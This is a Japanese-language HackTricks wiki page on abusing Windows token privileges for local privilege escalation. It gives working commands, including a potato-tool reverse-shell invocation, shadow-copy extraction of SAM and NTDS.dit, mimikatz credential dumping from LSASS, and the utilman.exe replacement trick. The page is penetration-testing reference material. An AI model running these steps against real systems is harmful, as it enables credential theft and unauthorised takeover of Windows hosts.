# Tokens の悪用

{{#include ../../banners/hacktricks-training.md}}

## Tokens

**Windows Access Tokens** が何か知らない場合は、続ける前にこのページを読んでください。


{{#ref}}
access-tokens.md
{{#endref}}

**すでに保持している tokens を悪用して、権限昇格できる場合があります。**

### SeImpersonatePrivilege

この権限があると、プロセスは token へのハンドルを取得できる場合に、その token を偽装できます（ただし、作成はできません）。exploit に対して NTLM 認証を行うよう Windows service（DCOM）を誘導することで、特権 token を取得でき、その後、SYSTEM 権限でプロセスを実行できます。<sup>[[2]](#references)</sup> この手法は、[JuicyPotato](https://github.com/ohpe/juicy-potato)、[RogueWinRM](https://github.com/antonioCoco/RogueWinRM)（WinRM が無効である必要があります）、[SweetPotato](https://github.com/CCob/SweetPotato)、[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) などのツールで悪用できます。

loopback のみでアクセスできる web application は、より特権の高い identity で、呼び出し元が指定した URL にリクエストを送る認証済み endpoint にローカル user がアクセスできる場合、別の誘導手段となる可能性があります。endpoint の認可と URL 制限、実際の outbound client identity と認証の挙動、およびその client が低権限 user の制御する listener にアクセスできるかを確認してください。有効な `SeImpersonatePrivilege`、IIS listener、または URL-fetch parameter があるだけでは、特権 token や権限昇格経路が存在するとは判断できません。この確認は受動的に行い、列挙中に誘導リクエストを送信しないでください。Microsoft の[client impersonation](https://learn.microsoft.com/en-us/windows/win32/secauthz/client-impersonation)および[IIS application-pool identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)のドキュメントを参照してください。

最近の operator 向けメモ:

- **JuicyPotato は旧式です**: Windows 10 1809+/Server 2019+ では、到達可能な RPC/COM surface に応じて、**GodPotato**、**SigmaPotato**、**PrintNotifyPotato**、**RoguePotato**、**SharpEfsPotato/EfsPotato**、または **PrintSpoofer** を優先してください。
- **`LOCAL SERVICE`** または **`NETWORK SERVICE`** として実行される service を侵害し、`whoami /priv` に **filtered token** が表示されて `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege` がない場合は、まずアカウントの**既定の privilege set**を復元し（たとえば **FullPowers** を使用）、その後 potato family を再試行してください。<sup>[[3]](#references)</sup>
- 新しい fork の中には、オリジナルのツールより operator にとって使いやすいものがあります。たとえば、**SigmaPotato** は reflection/in-memory execution と最新の Windows との互換性を追加し、**PrintNotifyPotato** は PrintNotify COM service を悪用します。従来の Spooler 経由が無効な場合に役立つことがよくあります。

```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

**SeImpersonatePrivilege**と非常によく似ており、特権トークンを取得するために**同じ方法**を使用します。\
この権限を使うと、新規または一時停止中のプロセスに**プライマリトークンを割り当てる**ことができます。特権付きの偽装トークンを使って、プライマリトークンを派生させることができます（DuplicateTokenEx）。\
このトークンを使って、'CreateProcessAsUser'で**新しいプロセス**を作成するか、プロセスを一時停止状態で作成してから**トークンを設定**できます（通常、実行中のプロセスのプライマリトークンは変更できません）。<sup>[[2]](#references)</sup>

### SeTcbPrivilege

このトークンを有効にすると、**KERB_S4U_LOGON**を使用して、認証情報を知らなくても任意のユーザーの**偽装トークン**を取得し、任意のグループ（admins）をトークンに**追加**し、トークンの**整合性レベル**を「**medium**」に設定して、このトークンを**現在のスレッド**に割り当てることができます（SetThreadToken）。<sup>[[2]](#references)</sup>

### SeBackupPrivilege

この権限により、システムは任意のファイルに対するすべての読み取りアクセスを許可します（読み取り操作に限定）。これは、レジストリからローカル Administrator アカウントの**パスワードハッシュを読み取る**ために利用され、その後、ハッシュを使って「**psexec**」や「**wmiexec**」などのツールを使用できます（Pass-the-Hash technique）。ただし、Local Administrator アカウントが無効になっている場合、またはリモート接続するLocal Administratorsから管理者権限を削除するポリシーが適用されている場合、この手法は失敗します。<sup>[[2]](#references)</sup>\
実際には、最も信頼性の高い組み込みの手順は通常、**VSS + `robocopy /b`**です。シャドウコピーを作成または公開し、**バックアップモード**で`SAM`/`SYSTEM`または`NTDS.dit`をコピーすることで、ファイルACLを回避します。<sup>[[4]](#references)</sup>

```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```

You can **この権限を悪用**できます:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)の**IppSec**の解説に従う
- または、以下の「**Backup Operatorsを使った権限昇格**」のセクションで説明されている方法:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

この権限により、ファイルのAccess Control List (ACL)に関係なく、あらゆるシステムファイルへの**書き込みアクセス**が可能になります。これにより、**サービスの変更**、DLL Hijackingの実行、Image File Execution Optionsを使った**デバッガー**の設定など、さまざまな方法で権限昇格が可能になります。<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilegeは強力な権限です。ユーザーがトークンを偽装する能力を持つ場合に特に有用ですが、SeImpersonatePrivilegeがない場合にも役立ちます。この機能は、現在のプロセスと同じユーザーを表し、現在のプロセスを超えない整合性レベルを持つトークンを偽装できることを前提としています。<sup>[[2]](#references)</sup>

**主なポイント:**

- **SeImpersonatePrivilegeなしでの偽装:** 特定の条件下では、SeCreateTokenPrivilegeを利用してトークンを偽装し、EoPを実現できます。
- **トークン偽装の条件:** 偽装を成功させるには、対象のトークンが同じユーザーに属し、偽装を試みるプロセスの整合性レベル以下である必要があります。
- **偽装トークンの作成と変更:** ユーザーは偽装トークンを作成し、特権グループのSID (Security Identifier)を追加して強化できます。

### SeLoadDriverPrivilege

この権限により、特定の`ImagePath`と`Type`の値を持つレジストリエントリを作成して、プロセスが**デバイスドライバーをロードおよびアンロード**できます。`HKLM` (HKEY_LOCAL_MACHINE)への直接の書き込みアクセスは制限されているため、代わりに`HKCU` (HKEY_CURRENT_USER)を使用できます。ただし、`HKCU`のエントリをカーネルがドライバー設定として認識するには、特定のパスが必要です。<sup>[[2]](#references)</sup>

現在の攻撃手法では、一般に**BYOVD** (bring your own vulnerable driver)が使われます。つまり、**署名済みだが脆弱な**カーネルドライバーをロードし、そのIOCTLを使って保護を無効化するか、カーネルコード実行に移行します。最近のWindows 11/Serverビルドでは、**Microsoft vulnerable driver blocklist**や**HVCI/Memory Integrity**によって古い公開手法が使えなくなることが多いため、従来の`szkg64.sys`形式の例が常に信頼できるとは限らない点に注意してください。

このパスは`\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`です。ここで`<RID>`は現在のユーザーのRelative Identifierです。`HKCU`内にこのパス全体を作成し、2つの値を設定する必要があります:<sup>[[2]](#references)</sup>

- `ImagePath`。実行するバイナリのパス
- `Type`。値は`SERVICE_KERNEL_DRIVER` (`0x00000001`)に設定します。

**手順:**

1. 書き込みアクセスが制限されているため、`HKLM`ではなく`HKCU`にアクセスします。
2. `HKCU`内に`\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`パスを作成します。`<RID>`は現在のユーザーのRelative Identifierを表します。
3. `ImagePath`にバイナリの実行パスを設定します。
4. `Type`に`SERVICE_KERNEL_DRIVER` (`0x00000001`)を設定します。

```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```

More ways to abuse this privilege in [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

これは**SeRestorePrivilege**に似ています。主な機能は、プロセスが**オブジェクトの所有権を取得する**ことを可能にし、WRITE_OWNER アクセス権を付与することで明示的な裁量アクセスを要求する仕組みを回避します。まず対象のレジストリキーの所有権を取得して書き込み可能にし、次に DACL を変更して書き込み操作を可能にします。<sup>[[2]](#references)</sup>

```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```

### SeDebugPrivilege

この権限があれば、**他のプロセスをデバッグ**でき、メモリの読み書きも可能です。この権限を利用して、ほとんどのアンチウイルスやホスト侵入防止ソリューションを回避できるメモリインジェクション手法を実行できます。<sup>[[2]](#references)</sup>

最新の Windows では、`SeDebugPrivilege` があれば通常、**保護されていない SYSTEM プロセス**を開いて、そのトークンを複製できます。ただし、**LSASS** にアクセスできる保証はありません。**RunAsPPL / LSA Protection** が有効な場合、`SeDebugPrivilege` があっても、保護されていないプロセスから LSASS の読み取りやインジェクションはできません。その場合は、別の非 PPL の SYSTEM プロセスからトークンを盗むか、`procdump` が使えると思い込まずに、PPL bypass/BYOVD と組み合わせてください。`SeDebugPrivilege` と `SeImpersonatePrivilege` を使ったトークン複製の詳しい例は、[こちらのページ](sedebug-+-seimpersonate-copy-token.md)を確認してください。

#### メモリのダンプ

[SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) の [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) を使って、**プロセスのメモリを取得**できます。具体的には、ユーザーがシステムへのログインに成功した後にユーザーの認証情報を保存する **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** プロセスが対象となります。

その後、このダンプを mimikatz に読み込ませて、パスワードを取得できます。

```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

以前に保存された読み取り可能な LSASS dump が、現在のアカウントに実行中の保護対象プロセスを取得する権限がなくても利用できる場合があります。dump file やそれに似た名前の archive は手掛かりとしてのみ扱ってください。アクセス権と内容を確認したうえで、復元された認証情報がまだ有効か、より高い権限のコンテキストを取得できるかを評価してください。ファイル名だけでは、archive に dump が含まれていることや、認証情報を再利用できることは証明できません。

#### RCE

`NT SYSTEM` shell を取得するには、次のものを使用できます。

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)

```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```

### SeManageVolumePrivilege

この権限（ボリュームの保守タスクを実行する）は、特権を要するボリューム操作に利用できますが、それだけで読み取り可能な raw-volume handle や任意のファイルアクセスが保証されるわけではありません。デバイス ACL、token の状態、Windows のバージョン、要求する操作も影響します。許可されたボリューム制御操作によって、代わりにファイルシステム ACL が変更される場合があります。これは変更を伴う、ボリューム全体に影響し得る操作です。CA ホストでの証明書悪用には、使用可能な秘密鍵の素材へのアクセスも必要です。また、EFS で保護されたファイルには、認証済みの復号鍵または回復鍵が必要です。詳細な前提条件は以下を参照してください。<sup>[[5]](#references)</sup>

詳細な手法と緩和策を参照してください。

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## 権限を確認する

```
whoami /priv
```

**無効**として表示されるtokenは通常有効化できるため、_有効_および_無効_の両方のprivilegeを悪用できることがよくあります。

### すべてのtokenを有効化する

無効化されたprivilegeがある場合は、[**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)スクリプトを使ってすべてのtokenを有効化できます。

```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```

または、この[**投稿**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)に埋め込まれた**スクリプト**。

## 表

すべての token privileges のチートシートは[https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)にあります。以下の概要では、権限を直接悪用して管理者セッションを取得する方法、または機密ファイルを読み取る方法のみを紹介します。<sup>[[1]](#references)</sup>

| Privilege                  | 影響      | ツール                    | 実行方法                                                                                                                                                                                                                                                                                                                                     | 備考                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**管理者**_ | サードパーティツール          | _"ユーザーが token を偽装し、potato.exe、rottenpotato.exe、juicypotato.exe などのツールを使って nt system に権限昇格できるようになります"_                                                                                                                                                                                                      | 更新してくれた [Aurélien Chalot](https://twitter.com/Defte_) に感謝します。近いうちに、よりレシピらしい説明に書き直します。                                                                                                                                                                                         |
| **`SeBackup`**             | **脅威**  | _**組み込みコマンド**_ | `robocopy /b` または SeBackup 対応の専用コピー補助ツールで機密ファイルを読み取ります。                                                                                                                                                                                                                                                                 | <p>- `SAM`/`SYSTEM`、`SECURITY`、`NTDS.dit`、場合によっては `%WINDIR%\MEMORY.DMP` の取得に有効です。<br><br>- `robocopy` は便利ですが、SeBackup 対応の専用 cmdlet/API のほうが、ロック中または開かれているファイルに対して柔軟に使えることがよくあります。</p>                                                                                                   |
| **`SeCreateToken`**        | _**管理者**_ | サードパーティツール          | `NtCreateToken` で、ローカル管理者権限を含む任意の token を作成します。                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**管理者**_ | **PowerShell**          | **非PPL**の SYSTEM token を複製するか、保護されていないプロセスからメモリをダンプします。                                                                                                                                                                                                                                                                 | <p>RunAsPPL/LSA Protection が有効な場合、LSASS のダンプは一般にブロックされます。</p><p>スクリプトは [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)にあります。</p>                                                                                                               |
| **`SeImpersonate`**        | _**管理者**_ | サードパーティツール          | **Potato family** / 名前付きパイプの偽装を使って SYSTEM としてプロセスを起動します（`PrintSpoofer`、`RoguePotato`、`GodPotato`、`SigmaPotato`、`PrintNotifyPotato` など）。                                                                                                                                                                                    | <p>IIS APPPOOL、MSSQL、スケジュールされたタスクなどのサービスアカウントや、すでに `SeImpersonatePrivilege` を持つコンテキストで特に実用的です。</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**管理者**_ | サードパーティツール          | <p>1. 署名済みだが脆弱なカーネルドライバー（BYOVD）を読み込む<br>2. ドライバーの IOCTL を使用してカーネルの読み書きを行い、セキュリティツールを無効化するか、SYSTEM に権限昇格する<br><br>また、この権限を使い、組み込みコマンドの <code>fltMC</code> でセキュリティ関連ドライバーをアンロードすることもできます。例：<code>fltMC sysmondrv</code></p>                     | <p><code>szkg64.sys</code> などの古い公開ドライバーは、脆弱なドライバーのブロックリスト/HVCI により、最近の Windows ではますますブロックされるようになっています。</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**管理者**_ | **PowerShell**          | <p>1. SeRestore 権限がある状態で PowerShell/ISE を起動します。<br>2. <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>) で権限を有効にします。<br>3. utilman.exe を utilman.old にリネームします<br>4. cmd.exe を utilman.exe にリネームします<br>5. コンソールをロックして Win+U を押します</p> | <p>一部の AV ソフトウェアが攻撃を検出する場合があります。</p><p>別の方法として、同じ権限を使って "Program Files" に保存されているサービスバイナリを置き換える手法があります。</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**管理者**_ | _**組み込みコマンド**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. cmd.exe を utilman.exe にリネームします<br>4. コンソールをロックして Win+U を押します</p>                                                                                                                                       | <p>一部の AV ソフトウェアが攻撃を検出する場合があります。</p><p>別の方法として、同じ権限を使って "Program Files" に保存されているサービスバイナリを置き換える手法があります。</p>                                                                                                                                                           |
| **`SeTcb`**                | _**管理者**_ | サードパーティツール          | <p>ローカル管理者権限を含むように token を操作します。SeImpersonate が必要な場合があります。</p><p>要検証。</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- [1] [gtworek/Priv2Admin - Windows の権限から管理者権限への悪用経路](https://github.com/gtworek/Priv2Admin)
- [2] [LPE のための Token Privileges の悪用](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Privileges を返して！お願いします？](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy（`/b` バックアップモードはファイル/フォルダーの ACL チェックをバイパス）](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – ボリュームの保守タスクを実行する（SeManageVolumePrivilege）](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate（SeManageVolumePrivilege → CA key の流出 → Golden Certificate）](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)
{{#include ../../banners/hacktricks-training.md}}
